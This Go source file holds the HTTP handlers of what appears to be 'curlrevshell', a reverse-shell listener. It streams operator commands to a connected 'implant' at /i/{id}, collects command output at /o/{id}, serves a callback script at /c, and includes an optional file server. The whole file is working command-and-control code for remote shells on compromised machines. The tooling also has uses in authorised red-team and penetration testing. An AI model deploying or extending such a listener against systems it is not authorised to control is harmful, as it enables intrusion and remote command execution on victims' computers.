package hsrv

/*
 * handlers.go
 * HTTP handlers
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240324
 */

import (
	"curlrevshell/lib/opshell"
	"fmt"
	"io"
	"net/http"
	"os"
)

const (
	// idParam is the named value in the path for the implant ID.
	idParam = "id"
)

const (
	// MultiConnectionMessage is returned when an implant tries to connect
	// when one is already connected.
	MultiConnectionMessage = "Eek!"
	// UnexpectedOutputMessage is returned when an implant sends an output
	// line but hasn't connected to /i/{id}.
	UnexpectedOutputMessage = "Wat?"
)

// newMux returns a new ServeMux, ready to serve.
func (s *Server) newMux() *http.ServeMux {
	mux := http.NewServeMux()

	/* Shellish handlers. */
	mux.HandleFunc("/i/{"+idParam+"}", s.inputHandler)  /* Shell input. */
	mux.HandleFunc("/o/{"+idParam+"}", s.outputHandler) /* Shell output. */
	mux.HandleFunc("/c", s.scriptHandler)               /* Callback script. */

	/* If we're serving static files, do that. */
	if "" != s.fdir {
		mux.HandleFunc("/", s.fileHandler)
	}

	return mux
}

// fileHandler logs and serves files.
func (s *Server) fileHandler(w http.ResponseWriter, r *http.Request) {
	/* Work out what to send back. */
	s.RLogf(FileColor, r, "File requested: %s", r.URL)
	f, err := os.Open(s.fdir)
	if nil != err {
		s.RErrorLogf(r, "Could not open %s: %s", s.fdir, err)
		http.Error(w, "", http.StatusInternalServerError)
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if nil != err {
		s.RErrorLogf(r, "Could not get info about %s: %s", s.fdir, err)
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	/* If we've just been given one file, send it for all requests. */
	if fi.Mode().IsRegular() {
		http.ServeContent(w, r, s.fdir, fi.ModTime(), f)
		return
	}

	/* For everything else, let the http library do the work. */
	http.FileServer(http.Dir(s.fdir)).ServeHTTP(w, r)
}

// inputHandler accepts a connection from a shell and sends it input.
func (s *Server) inputHandler(w http.ResponseWriter, r *http.Request) {
	/* Get the Implant ID. */
	id := s.getID(r)
	if "" == id {
		return
	}

	/* Make sure we're the only implant connected. */
	if !s.curID.CompareAndSwap(nil, &id) {
		/* Work out what's currently connected. */
		curID := s.curID.Load()
		if nil == curID { /* Threading is hard. */
			s.RErrorLogf(
				r,
				"Rejected connection from ID %s, "+
					"connected too soon after last disconnect",
				id,
			)
		} else {
			s.RErrorLogf(
				r,
				"Rejected connection from ID %s, "+
					"current ID is %s",
				id,
				*curID,
			)
		}
		http.Error(
			w,
			MultiConnectionMessage,
			http.StatusServiceUnavailable,
		)
		return
	}
	s.RLogf(ConnectedColor, r, "Got a shell: ID:%s", id)
	defer s.curID.Store(nil)

	/* Proxy lines from stdin. */
	rc := http.NewResponseController(w)
	for {
		select {
		case l, ok := <-s.ich:
			if !ok { /* Input channel closed. */
				return
			}
			if _, err := fmt.Fprintf(w, "%s\n", l); nil != err {
				s.RErrorLogf(r, "Error sending line: %s", err)
				return
			}
			if err := rc.Flush(); nil != err {
				s.RErrorLogf(r, "Error flushing line: %s", err)
				return
			}
		case <-r.Context().Done():
			s.RErrorLogf(r, "Disconnected.")
			return
		}
	}
}

// outputHandler receives a line of output from the shell and prints it, if the
// id matches the currently-connected shell.
func (s *Server) outputHandler(w http.ResponseWriter, r *http.Request) {
	/* Get the Implant ID. */
	id := s.getID(r)
	if "" == id {
		return
	}
	/* Make sure it's the right shell. */
	if curID := s.curID.Load(); nil == curID || id != *curID {
		if nil == curID {
			s.RErrorLogf(
				r,
				"No connection but got output from ID %s",
				id,
			)
		} else {
			s.RErrorLogf(
				r,
				"Got output from ID %s while "+
					"ID %s is connected",
				id,
				*curID,
			)
		}
		http.Error(
			w,
			UnexpectedOutputMessage,
			http.StatusFailedDependency,
		)
		return
	}

	/* Send the output back. */
	b, err := io.ReadAll(r.Body)
	if 0 != len(b) {
		s.Logf(opshell.ColorNone, "%s", string(b))
	}
	if nil != err {
		s.RErrorLogf(r, "Error reading request body: %s", err)
	}
}

// getID gets the ID for the implant from the request.  If there is no ID, it
// logs and error and returns the empty string.
func (s *Server) getID(r *http.Request) string {
	id := r.PathValue(idParam)
	if "" == id {
		s.RErrorLogf(r, "No ID in URL")
	}
	return id
}
